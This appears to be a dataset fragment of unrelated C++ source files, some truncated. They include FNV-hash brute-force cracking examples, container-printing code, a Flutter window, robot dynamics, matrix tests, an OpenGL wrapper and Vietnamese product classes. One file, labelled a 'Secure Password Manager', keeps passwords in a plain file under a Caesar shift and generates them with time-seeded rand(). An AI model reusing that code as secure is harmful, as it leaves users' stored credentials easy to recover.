    "#include <iostream>\n#include \"crack.hpp\"\n\n// using a known initial string just to test\nvoid example_1() {\n    printf(\"--- EXAMPLE 1 ---\\n\");\n    using FNV_t = FNVUtil<>;\n    using CrackUtils_t = CrackUtils<>;\n\n    // setup\n    auto crack = CrackUtils_t();\n    string to_hash = \"known/crackmelol.exe\";\n    uint64_t hashed = FNV_t::hash(to_hash);\n\n    // var to store cracked string if found\n    string result;\n\n    // max string length without needing to brute force is 8\n    // since the string we want to crack is of length 10, we need 2 chars of brute force\n    constexpr int BRUTE_CHARS = 2;\n\n    // adding known prefix and suffix (useful if you're trying to crack a hashed filename)\n    const string known_prefix = \"known/\";\n    const string known_suffix = \".exe\";\n    \n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n    if (crack.try_crack_single(result, hashed, to_hash.size(), BRUTE_CHARS, known_prefix, known_suffix)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// example of cracking hash without knowing what it is beforehand\nvoid example_2() {\n    printf(\"--- EXAMPLE 2 ---\\n\");\n    using CrackUtils_t = CrackUtils<>;\n\n    // setup\n    auto crack = CrackUtils_t();\n\n    // hashed string we want to crack\n    uint64_t hashed = 0xC5BE054CB26B3829;\n\n    // var to store cracked string if we find it\n    string result;\n\n    // max string length to try to crack\n    constexpr int MAX_LEN = 10;\n\n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n\n    // note the use of brute_n, this just runs try_crack_single with lengths [1, MAX_LEN]\n    if (crack.brute_n(result, hashed, MAX_LEN)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// cracking hash that's truncated to 63 bits which uses a different offset basis and prime\nvoid example_3() {\n    printf(\"--- EXAMPLE 3 ---\\n\");\n    constexpr uint64_t OFFSET_BASIS = 0xE4A68FF7D4912FD2;\n    constexpr uint64_t PRIME = PRIME_233;\n    constexpr uint32_t BIT_LEN = 63;\n\n    using FNV_t = FNVUtil<OFFSET_BASIS, PRIME, BIT_LEN>;\n    using CrackUtils_t = CrackUtils<OFFSET_BASIS, PRIME, BIT_LEN>;\n\n    // setup (everything below is copied from the first example)\n    auto crack = CrackUtils_t();\n    string to_hash = \"known/crackmelol.exe\";\n    uint64_t hashed = FNV_t::hash(to_hash);\n\n    // var to store cracked string if found\n    string result;\n\n    // max string length without needing to brute force is 8\n    // since the string we want to crack is of length 10, we need 2 chars of brute force\n    constexpr int BRUTE_CHARS = 2;\n\n    // adding known prefix and suffix (useful if you're trying to crack a hashed filename)\n    const string known_prefix = \"known/\";\n    const string known_suffix = \".exe\";\n    \n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n    if (crack.try_crack_single(result, hashed, to_hash.size(), BRUTE_CHARS, known_prefix, known_suffix)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// cracking hash and using a character list to help avoid returning weird collisions\nvoid example_4() {\n    printf(\"--- EXAMPLE 4 ---\\n\");\n\n    using FNV_t = FNVUtil<>;\n    using CrackUtils_t = CrackUtils<>;\n\n    // list of valid characters\n    string charset = \"0123456789abcdef\";\n\n    // you can also use some of the presets defined in crack.hpp\n    /*\n    namespace presets {\n        static std::string valid = \"0123456789abcdefghijklmnopqrstuvwxyz!\\\"#$%&'()*+,-./:;<=>?@[]^_`{|}~ \";\n        static std::string valid_func = \"0123456789abcdefghijklmnopqrstuvwxyz_\";\n        static std::string valid_file = \"0123456789abcdefghijklmnopqrstuvwxyz_./\";\n        static std::string valid_gsc = \"0123456789abcdefghijklmnopqrstuvwxyz_./:\";\n    }\n\n    Ex: string charset = presets::valid_file;\n    */\n\n    // setup\n    auto crack = CrackUtils_t(charset);\n    string to_hash = \"abc9784def\";\n    uint64_t hashed = FNV_t::hash(to_hash);\n\n    // var to store cracked string if found\n    string result;\n\n    // max string length without needing to brute force is 8\n    // since the string we want to crack is of length 10, we need 2 chars of brute force\n    constexpr int BRUTE_CHARS = 2;\n    \n    // crack\n    printf(\"Trying to crack: 0x%016lX\\n\", hashed);\n    if (crack.try_crack_single(result, hashed, to_hash.size(), BRUTE_CHARS)) {\n        printf(\"Found! %s\\n\", result.c_str());\n    } else {\n        printf(\"Failed ):\\n\");\n    }\n\n    printf(\"\\n\");\n}\n\n// example usages\nint main() {\n    example_1();\n    example_2();\n    example_3();\n    example_4();\n\n    return 0;\n}",
    "#include \"../include/container_view.h\"\n#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <array>\n#include <tuple>\n#include <forward_list>\n\nint main() {\n    // Pair\n    std::pair<int, double> p = {1, 3.14};\n    std::cout << \"Pair: \" << p << std::endl;\n\n    // Tuple\n    std::tuple<int, char, double> t = {1, 'a', 2.3};\n    std::cout << \"Tuple: \" << t << std::endl;\n\n    // Array\n    std::array<int, 3> arr = {1, 2, 3};\n    std::cout << \"Array: \" << arr << std::endl;\n\n    // Deque\n    std::deque<double> dq = {1.1, 2.2, 3.3};\n    std::cout << \"Deque: \" << dq << std::endl;\n\n    // Forward List\n    std::forward_list<int> fl = {1, 2, 3};\n    std::cout << \"Forward List: \" << fl << std::endl;\n\n    // Initializer list (note: we cannot print directly, used only for example)\n    std::initializer_list<int> il = {1, 2, 3};\n\n    // List\n    std::list<int> lst = {1, 2, 3};\n    std::cout << \"List: \" << lst << std::endl;\n\n    // Vector\n    std::vector<std::string> vec = {\"hello\", \"world\"};\n    std::cout << \"Vector: \" << vec << std::endl;\n\n    // Set\n    std::set<std::string> set = {\"apple\", \"banana\", \"cherry\"};\n    std::cout << \"Set: \" << set << std::endl;\n\n    // Multiset\n    std::multiset<int> mset = {4, 5, 4, 1};\n    std::cout << \"Multiset: \" << mset << std::endl;\n\n    // Unordered Set\n    std::unordered_set<int> uset = {4, 5, 6, 7};\n    std::cout << \"Unordered Set: \" << uset << std::endl;\n\n    // Unordered Multiset\n    std::unordered_multiset<int> umset = {4, 5, 6, 6};\n    std::cout << \"Unordered Multiset: \" << umset << std::endl;\n\n    // Map\n    std::map<char, int> map = {{'a', 1}, {'b', 2}};\n    std::cout << \"Map: \" << map << std::endl;\n\n    // Multimap\n    std::multimap<char, int> mmap = {{'a', 1}, {'a', 2}};\n    std::cout << \"Multimap: \" << mmap << std::endl;\n\n    // Unordered Map\n    std::unordered_map<char, int> umap = {{'c', 3}, {'b', 2}};\n    std::cout << \"Unordered Map: \" << umap << std::endl;\n\n    // Unordered Multimap\n    std::unordered_multimap<char, int> ummap = {{'c', 3}, {'c', 4}};\n    std::cout << \"Unordered Multimap: \" << ummap << std::endl;\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <algorithm>\r\n#include <cctype>\r\n#include <map>\r\n#include <sstream>\r\n#include <limits> \r\n#include <stdexcept> \r\n\r\nstd::string generateRandomPassword(int length) {\r\n    const std::string charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\";\r\n    std::string password;\r\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\r\n    for (int i = 0; i < length; ++i) {\r\n        password += charset[std::rand() % charset.size()];\r\n    }\r\n    return password;\r\n}\r\n\r\nstd::string encrypt(const std::string& text, int key) {\r\n    std::string result = text;\r\n    for (char& c : result) {\r\n        if (std::isalpha(c)) {\r\n            char base = std::isupper(c) ? 'A' : 'a';\r\n            c = (c - base + key) % 26 + base;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nstd::string decrypt(const std::string& text, int key) {\r\n    return encrypt(text, 26 - key);\r\n}\r\n\r\nvoid storePassword(const std::string& site, const std::string& username, const std::string& password) {\r\n    std::ofstream file(\"C:\\\\mang.txt\", std::ios::app);\r\n    if (file.is_open()) {\r\n        std::string encryptedSite = encrypt(site, 3);\r\n        std::string encryptedUsername = encrypt(username, 3);\r\n        std::string encryptedPassword = encrypt(password, 3);\r\n        file << encryptedSite << \" \" << encryptedUsername << \" \" << encryptedPassword << std::endl;\r\n        std::cout << \"Password stored successfully.\" << std::endl;\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open file for storing password.\" << std::endl;\r\n        system(\"cls\");\r\n    }\r\n}\r\n\r\nstd::map<std::string, std::pair<std::string, std::string>> retrievePasswords() {\r\n    std::ifstream file(\"C:\\\\mang.txt\");\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    if (file.is_open()) {\r\n        std::string line;\r\n        while (std::getline(file, line)) {\r\n            std::istringstream iss(line);\r\n            std::string encryptedSite, encryptedUsername, encryptedPassword;\r\n            if (iss >> encryptedSite >> encryptedUsername >> encryptedPassword) {\r\n                std::string site = decrypt(encryptedSite, 3);\r\n                std::string username = decrypt(encryptedUsername, 3);\r\n                std::string password = decrypt(encryptedPassword, 3);\r\n                passwords[site] = std::make_pair(username, password);\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open password file for retrieval.\" << std::endl;\r\n    }\r\n    return passwords;\r\n}\r\n\r\nvoid clearScreen() {\r\n#ifdef _WIN32\r\n    system(\"cls\");\r\n#else\r\n    system(\"clear\");\r\n#endif\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    do {\r\n        clearScreen();\r\n        passwords = retrievePasswords();\r\n        std::cout << \"\\nSecure Password Manager\\n\";\r\n        std::cout << \"1. Store New Password\\n\";\r\n        std::cout << \"2. Retrieve Password\\n\";\r\n        std::cout << \"3. Generate Random Password\\n\";\r\n        std::cout << \"4. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n\r\n        switch (choice) {\r\n        case 1: {\r\n            std::string site, username, password;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            std::cout << \"Enter username: \";\r\n            std::getline(std::cin, username);\r\n            std::cout << \"Enter password: \";\r\n            std::getline(std::cin, password);\r\n            storePassword(site, username, password);\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 2: {\r\n            std::string site;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            auto it = passwords.find(site);\r\n            if (it != passwords.end()) {\r\n                std::cout << \"Username: \" << it->second.first << std::endl;\r\n                std::cout << \"Password: \" << it->second.second << std::endl;\r\n            }\r\n            else {\r\n                std::cout << \"Password not found for the given site.\" << std::endl;\r\n            }\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 3: {\r\n            int length;\r\n            std::cout << \"Enter password length: \";\r\n            std::cin >> length;\r\n            std::cout << \"Generated Password: \" << generateRandomPassword(length) << std::endl;\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 4:\r\n            std::cout << \"Exi",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"srbd.hpp\"\n\n#include <proxsuite/proxqp/dense/dense.hpp>\n\nnamespace srbd {\n    using qp_t = proxsuite::proxqp::dense::QP<double>;\n    using qp_mat_t = proxsuite::proxqp::dense::Mat<double>;\n    using qp_vec_t = proxsuite::proxqp::dense::Vec<double>;\n\n    SingleRigidBodyDynamics::SingleRigidBodyDynamics(const SingleRigidBodyDynamics& other)\n    {\n        // TO-DO: This is not the best way to handle this!! BUT should be okay for now..\n        operator=(other);\n    }\n\n    SingleRigidBodyDynamics& SingleRigidBodyDynamics::operator=(const SingleRigidBodyDynamics& other)\n    {\n        // COM state\n        _base_position = other._base_position;\n        _base_vel = other._base_vel;\n        _base_orientation = other._base_orientation;\n        _base_angular_vel = other._base_angular_vel;\n\n        // Feet state\n        _feet_positions = other._feet_positions;\n        _feet_phases = other._feet_phases;\n\n        // Static ref poses/bounds\n        _feet_ref_positions = other._feet_ref_positions;\n        _feet_min_bounds = other._feet_min_bounds;\n        _feet_max_bounds = other._feet_max_bounds;\n\n        // Phase Handler\n        _phase_handler = std::move(other._phase_handler->clone());\n\n        // Terrain\n        _terrain = std::move(other._terrain->clone());\n\n        // General state\n        _mass = other._mass;\n        _inertia = other._inertia;\n        _inertia_inv = other._inertia_inv;\n\n        // Global variables\n        _dt = other._dt;\n        _g = other._g;\n        _gravity = other._gravity;\n\n        // Helper variables\n        _last_qp_result_valid = other._last_qp_result_valid;\n\n        return *this;\n    }\n\n    void SingleRigidBodyDynamics::set_sim_data(double dt, double gravity)\n    {\n        _dt = dt;\n        _g = std::abs(gravity);\n        _gravity = Vec3d(0, 0, -_g);\n    }\n\n    void SingleRigidBodyDynamics::set_inertial_data(double mass, const RotMat& inertia)\n    {\n        _mass = mass;\n        _inertia = inertia;\n        _inertia_inv = inertia.inverse();\n    }\n\n    void SingleRigidBodyDynamics::set_feet_data(const std::vector<Vec3d>& feet_ref_positions, const std::vector<Vec3d>& feet_min_bounds, const std::vector<Vec3d>& feet_max_bounds)\n    {\n        assert((_feet_ref_positions.size() == _feet_min_bounds.size() == _feet_max_bounds.size()) && \"Not consistent number of feet!\");\n        _feet_ref_positions = feet_ref_positions;\n        _feet_min_bounds = feet_min_bounds;\n        _feet_max_bounds = feet_max_bounds;\n    }\n\n    void SingleRigidBodyDynamics::set_data(const Vec3d& base_position, const Vec3d& base_velocity, const RotMat& base_orientation, const Vec3d& base_angular_velocity, const std::vector<Vec3d>& feet_positions, const std::vector<size_t>& feet_phases)\n    {\n        // Base-related\n        _base_position = base_position;\n        _base_vel = base_velocity;\n        _base_orientation = base_orientation;\n        _base_angular_vel = base_angular_velocity;\n\n        // Feet-related\n        assert(feet_positions.size() == _feet_ref_positions.size() && feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n        _feet_phases = feet_phases;\n    }\n\n    void SingleRigidBodyDynamics::set_base_position(const Vec3d& pos) { _base_position = pos; }\n\n    void SingleRigidBodyDynamics::set_base_velocity(const Vec3d& vel) { _base_vel = vel; }\n\n    void SingleRigidBodyDynamics::set_base_orientation(const RotMat& rot) { _base_orientation = rot; }\n\n    void SingleRigidBodyDynamics::set_base_angular_velocity(const Vec3d& ang_vel) { _base_angular_vel = ang_vel; }\n\n    void SingleRigidBodyDynamics::set_feet_positions(const std::vector<Vec3d>& feet_positions)\n    {\n        assert(feet_positions.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n    }\n\n    void SingleRigidBodyDynamics::set_feet_phases(const std::vector<size_t>& feet_phases)\n    {\n        assert(feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_phases = feet_phases;\n    }\n\n    std::tuple<Matrix, Matrix, Vector> SingleRigidBodyDynamics::linearize() const\n    {\n        const size_t n_dim = 9;\n        const size_t n_feet = _feet_ref_positions.size();\n        const size_t m_dim = n_feet * 3;\n\n        Matrix L_c = skew(_base_angular_vel) * (_inertia - skew(_inertia * _base_angular_vel)); // optimal gain\n        // State Space Model X_n+1 = A*X_n + B*U_n\n        // Define A Matrix\n        Matrix A = Matrix::Zero(n_dim, n_dim);\n        // Block of size (p,q), starting at (i,j)\tmatri_block(i,j,p,q); matri_block<p,q>(i,j);\n        A.block(0, 0, 3, 3) = Matrix::Identity(3, 3);\n        A.block(0, 3, 3, 3) = Matrix::Identity(3, 3) * _dt;\n        A.block(3, 3, 3, 3) = Matrix::Identity(3, 3);\n        A.block(6, 6, 3, 3) = Matrix::Identity(3, 3) - _dt * _inertia_inv * L_c;\n\n        // Define B Matrix\n        Matrix B = Matrix::Zero(n_dim, m_dim);\n        B.block(0, 0, 3, 3 * n_feet) = kron((((0.5 * _",
    "#include \"matrix.h\"\n\n#include <gtest/gtest.h>\n\nnamespace mca {\nnamespace test {\nTEST(TestShape, defaultConstructor) {\n    Shape s;\n    ASSERT_EQ(s.rows, 0);\n    ASSERT_EQ(s.columns, 0);\n}\n\nTEST(TestShape, equal) {\n    Shape s1{4, 5};\n    Shape s2{4, 5};\n    ASSERT_EQ(s1, s2);\n}\n\nTEST(TestShape, notEqual) {\n    Shape s1{4, 5};\n    Shape s2{4, 4};\n    ASSERT_NE(s1, s2);\n}\n\nTEST(TestShape, size) {\n    Shape s{3, 2};\n    ASSERT_EQ(s.size(), 3 * 2);\n}\n\n// test all constructors\nTEST(TestMatrix, constructors) {\n    Matrix<int> m;\n    ASSERT_EQ(m.getShape(), Shape(0, 0));\n    ASSERT_EQ(m.dataPtr(), nullptr);\n    Matrix<int> m1(Shape{3, 3}, -1);\n    ASSERT_EQ(m1.getShape(), Shape(3, 3));\n    ASSERT_NE(m1.dataPtr(), nullptr);\n    for (size_t i = 0; i < m.getShape().rows; i++) {\n        for (size_t j = 0; j < m.getShape().columns; j++) { ASSERT_EQ(m.get(i, j), -1); }\n    }\n    Matrix<int> m2 = Matrix<int>({{-1, -1, -1}, {-1, -1, -1}});\n    ASSERT_EQ(m2.getShape(), Shape(2, 3));\n    ASSERT_NE(m2.dataPtr(), nullptr);\n    for (size_t i = 0; i < m2.getShape().rows; i++) {\n        for (size_t j = 0; j < m2.getShape().columns; j++) { ASSERT_EQ(m2.get(i, j), -1); }\n    }\n}\n\nTEST(TestMatrix, assignments) {\n    Matrix<int> m;\n    ASSERT_EQ(m.getShape(), Shape(0, 0));\n    ASSERT_EQ(m.dataPtr(), nullptr);\n    m = Matrix<int>({3, 3}, 1);\n    ASSERT_EQ(m.getShape(), Shape(3, 3));\n    ASSERT_NE(m.dataPtr(), nullptr);\n    for (size_t i = 0; i < m.rows(); i++) {\n        for (size_t j = 0; j < m.columns(); j++) { ASSERT_EQ(m.get(i, j), 1); }\n    }\n}\n\n// test get() and getShape()\nTEST(TestMatrix, geter) {\n    Matrix<int> m({{1, 2, 3}, {4, 5, 6}, {7, 8, 9}});\n    ASSERT_EQ(m.getShape(), Shape(3, 3));\n    for (size_t i = 0; i < m.getShape().rows; i++) {\n        for (size_t j = 0; j < m.getShape().columns; j++) {\n            ASSERT_EQ(m.get(i, j), i * 3 + j + 1);\n            m.get(i, j) = 0;\n            ASSERT_EQ(m.get(i, j), 0);\n        }\n    }\n}\n\nTEST(TestMatrix, reshape) {\n    Matrix<int> m({{1, 2, 3, 4, 5, 6}});\n    ASSERT_EQ(m.getShape(), Shape(1, 6));\n    m.reshape({2, 3});\n    ASSERT_EQ(m.getShape(), Shape(2, 3));\n}\n}  // namespace test\n}  // namespace mca\n",
    "//\n// Created by ivan on 2024/5/4.\n//\n\n#include \"GL.hpp\"\n#include <functional>\n#include <spdlog/spdlog.h>\n\nnamespace lgl {\n\n// process all input: query GLFW whether relevant keys are pressed/released this frame and react accordingly\n// ---------------------------------------------------------------------------------------------------------\nstatic void framebuffer_size_callback(GLFWwindow* window, int width, int height);\n\nGL::GL() : GL(800, 600) {}\n\nGL::GL(int windowWidth, int windowHeight) : m_windowWidth_{windowWidth}, m_windowHeight_{windowHeight} {\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    m_window_ = glfwCreateWindow(windowWidth, windowHeight, \"Triangle\", nullptr, nullptr);\n    if (!m_window_) {\n        spdlog::error(\"Failed to create GLFW window!\");\n        glfwTerminate();\n        return;\n    }\n    glfwMakeContextCurrent(m_window_);\n    glfwSetFramebufferSizeCallback(m_window_, framebuffer_size_callback);\n    if (!gladLoadGLLoader((GLADloadproc) glfwGetProcAddress)) {\n        spdlog::error(\"Failed to initialize GLAD!\");\n        return;\n    }\n\n    glEnable(GL_DEPTH_TEST);\n\n    bValid = true;\n}\n\nbool GL::is_should_close() {\n    return glfwWindowShouldClose(m_window_);\n}\n\nvoid GL::process_input() {\n    if (glfwGetKey(m_window_, GLFW_KEY_ESCAPE) == GLFW_PRESS)\n        glfwSetWindowShouldClose(m_window_, true);\n}\n\nvoid GL::swap_buffers() {\n    glfwSwapBuffers(m_window_);\n}\n\nvoid GL::poll_events() {\n    glfwPollEvents();\n}\n\nGL::~GL() {\n    glfwTerminate();\n}\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height) {\n    // make sure the viewport matches the new window dimensions; note that width and\n    // height will be significantly larger than specified on retina displays.\n    glViewport(0, 0, width, height);\n}\n\n\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <map>\r\n#include <algorithm>\r\n#include <stdexcept>\r\n#include <unordered_map>\r\n\r\nusing namespace std;\r\n\r\n// Class c\u01a1 b\u1ea3n cho S\u1eefa\r\nclass Sua {\r\nprotected:\r\n    std::string maHang;\r\n    std::string tenHang;\r\n    std::string ngaySanXuat;\r\n    std::string ngayHetHan;\r\n    std::string noiSanXuat;\r\n    int donGiaNhap;\r\n    int donGiaBan;\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    Sua() : maHang(\"\"), tenHang(\"\"), ngaySanXuat(\"\"), ngayHetHan(\"\"), noiSanXuat(\"\"), donGiaNhap(0), donGiaBan(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    Sua(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb)\r\n        : maHang(ma), tenHang(ten), ngaySanXuat(nsx), ngayHetHan(hsd), noiSanXuat(noiSX), donGiaNhap(dgn), donGiaBan(dgb) {}\r\n\r\n    // Getter v\u00e0 Setter cho c\u00e1c thu\u1ed9c t\u00ednh\r\n    std::string getMaHang() const { return maHang; }\r\n    void setMaHang(const std::string& ma) { maHang = ma; }\r\n    std::string getTenHang() const { return tenHang; }\r\n    void setTenHang(const std::string& ten) { tenHang = ten; }\r\n    std::string getNgaySanXuat() const { return ngaySanXuat; }\r\n    void setNgaySanXuat(const std::string& nsx) { ngaySanXuat = nsx; }\r\n    std::string getNgayHetHan() const { return ngayHetHan; }\r\n    void setNgayHetHan(const std::string& hsd) { ngayHetHan = hsd; }\r\n    std::string getNoiSanXuat() const { return noiSanXuat; }\r\n    void setNoiSanXuat(const std::string& noiSX) { noiSanXuat = noiSX; }\r\n    int getDonGiaNhap() const { return donGiaNhap; }\r\n    void setDonGiaNhap(int value) {\r\n        if (value < 0) {\r\n            throw std::invalid_argument(\"\u0110\u01a1n gi\u00e1 nh\u1eadp kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        donGiaNhap = value;\r\n    }\r\n    int getDonGiaBan() const { return donGiaBan; }\r\n    void setDonGiaBan(int value) {\r\n        if (value < 0) {\r\n            throw std::invalid_argument(\"\u0110\u01a1n gi\u00e1 b\u00e1n kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        donGiaBan = value;\r\n    }\r\n\r\n    // H\u00e0m nh\u1eadp th\u00f4ng tin t\u1eeb b\u00e0n ph\u00edm\r\n    void nhapThongTin() {\r\n        cout << \"Nhap ma hang: \";\r\n        std::getline(cin, maHang);\r\n        cout << \"Nhap ten hang: \";\r\n        std::getline(cin, tenHang);\r\n        cout << \"Nhap ngay san xuat (YYYY-MM-DD): \";\r\n        std::getline(cin, ngaySanXuat);\r\n        cout << \"Nhap ngay het han (YYYY-MM-DD): \";\r\n        std::getline(cin, ngayHetHan);\r\n        cout << \"Nhap noi san xuat: \";\r\n        std::getline(cin, noiSanXuat);\r\n        cout << \"Nhap don gia nhap: \";\r\n        cin >> donGiaNhap;\r\n        cout << \"Nhap don gia ban: \";\r\n        cin >> donGiaBan;\r\n        cin.ignore();\r\n    }\r\n\r\n    // H\u00e0m xu\u1ea5t th\u00f4ng tin\r\n    void xuatThongTin() const {\r\n        cout << \"Ma hang: \" << maHang << std::endl;\r\n        cout << \"Ten hang: \" << tenHang << std::endl;\r\n        cout << \"Ngay san xuat: \" << ngaySanXuat << std::endl;\r\n        cout << \"Ngay het han: \" << ngayHetHan << std::endl;\r\n        cout << \"Noi san xuat: \" << noiSanXuat << std::endl;\r\n        cout << \"Don gia nhap: \" << donGiaNhap << std::endl;\r\n        cout << \"Don gia ban: \" << donGiaBan << std::endl;\r\n    }\r\n};\r\n\r\n// Class S\u1eefa B\u1ed9t k\u1ebf th\u1eeba t\u1eeb S\u1eefa\r\nclass SuaBot : public Sua {\r\nprivate:\r\n    int trongLuong; // Tr\u1ecdng l\u01b0\u1ee3ng (g)\r\n    // Quy c\u00e1ch \u0111\u00f3ng g\u00f3i: m\u1ed7i th\u00f9ng 6 lon\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    SuaBot() : Sua(), trongLuong(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    SuaBot(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb, int tl)\r\n        : Sua(ma, ten, nsx, hsd, noiSX, dgn, dgb), trongLuong(tl) {}\r\n\r\n    // Getter v\u00e0 Setter cho trongLuong\r\n    int getTrongLuong() const { return trongLuong; }\r\n    void setTrongLuong(int tl) {\r\n        if (tl < 0) {\r\n            throw std::invalid_argument(\"Tr\u1ecdng l\u01b0\u1ee3ng kh\u00f4ng \u0111\u01b0\u1ee3c \u00e2m\");\r\n        }\r\n        trongLuong = tl;\r\n    }\r\n\r\n    // H\u00e0m nh\u1eadp th\u00f4ng tin s\u1eefa b\u1ed9t\r\n    void nhapThongTin() {\r\n        Sua::nhapThongTin(); // G\u1ecdi h\u00e0m nh\u1eadp th\u00f4ng tin t\u1eeb class c\u01a1 s\u1edf\r\n        cout << \"Nhap trong luong (g): \";\r\n        cin >> trongLuong;\r\n        cin.ignore(); \r\n    }\r\n\r\n    // H\u00e0m xu\u1ea5t th\u00f4ng tin s\u1eefa b\u1ed9t\r\n    void xuatThongTin() const {\r\n        Sua::xuatThongTin(); // G\u1ecdi h\u00e0m xu\u1ea5t th\u00f4ng tin t\u1eeb class c\u01a1 s\u1edf\r\n        cout << \"Trong luong: \" << trongLuong << \" g\" << std::endl;\r\n    }\r\n};\r\n\r\n// Class S\u1eefa Pha S\u1eb5n k\u1ebf th\u1eeba t\u1eeb S\u1eefa\r\nclass SuaPhaSan : public Sua {\r\nprivate:\r\n    int dungTich; // Dung t\u00edch (ml)\r\n    // Quy c\u00e1ch \u0111\u00f3ng g\u00f3i: m\u1ed7i th\u00f9ng 48 h\u1ed9p\r\n\r\npublic:\r\n    // Constructor m\u1eb7c \u0111\u1ecbnh\r\n    SuaPhaSan() : Sua(), dungTich(0) {}\r\n\r\n    // Constructor v\u1edbi tham s\u1ed1\r\n    SuaPhaSan(const std::string& ma, const std::string& ten, const std::string& nsx, const std::string& hsd, const std::string& noiSX, int dgn, int dgb, int dt)\r\n        : Sua(ma, ten, nsx, hsd, noiSX, dgn, dgb), dungTich(dt) {}\r\n\r\n    // Getter v\u00e0 Setter cho dungTich\r\n    int getDungTich() const { return dungTich; }\r\n    void setDungTich(int",
